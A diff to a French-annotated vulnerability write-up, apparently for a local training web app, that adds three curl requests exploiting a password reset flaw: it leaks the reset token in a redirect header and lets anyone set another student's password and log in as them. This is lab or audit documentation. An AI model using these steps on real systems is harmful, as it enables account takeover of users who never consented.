@@ -1,4 +1,4 @@
-# Password Reset Verification Bypass
+# Identification and Authentication Failures
 
 ## Category
 
@@ -20,6 +20,32 @@ http://localhost:4942/forum/r8y1ib6ub8g47u2
 1. Go to http://localhost:4942/reset-password
 2. give one the student email (benjamin@student.42.tech for example)
 3. enter a new password, validate and login with this email and new password
+
+ou bien ./exploit.sh
+ou bien éxécuter dans une console :
+Requête 1 — Demande de reset et récupération du token dans Location
+curl -i -sS \
+  -X POST 'http://localhost:4942/reset-password/request' \
+  -H 'Content-Type: application/x-www-form-urlencoded' \
+  --data-urlencode 'email=dorian@student.42.tech'
+
+Requête 2 — Validation du nouveau mot de passe avec le token reçu
+Remplace <TOKEN_RECUPERE> par la valeur du paramètre token= obtenue dans le header Location de la requête 1 :
+curl -i -sS \
+  -X POST 'http://localhost:4942/reset-password/confirm' \
+  -H 'Content-Type: application/x-www-form-urlencoded' \
+  --data-urlencode 'email=dorian@student.42.tech' \
+  --data-urlencode 'token=<TOKEN_RECUPERE>' \
+  --data-urlencode 'new_password=TestPass1234'
+
+Requête 3 — Connexion avec l'utilisateur et le nouveau mot de passe
+curl -i -sS -c cookies.txt \
+  -X POST 'http://localhost:4942/login' \
+  -H 'Content-Type: application/x-www-form-urlencoded' \
+  --data-urlencode 'identity=dorian@student.42.tech' \
+  --data-urlencode 'password=TestPass1234'
+
+
 
 ## Security Assessment
 
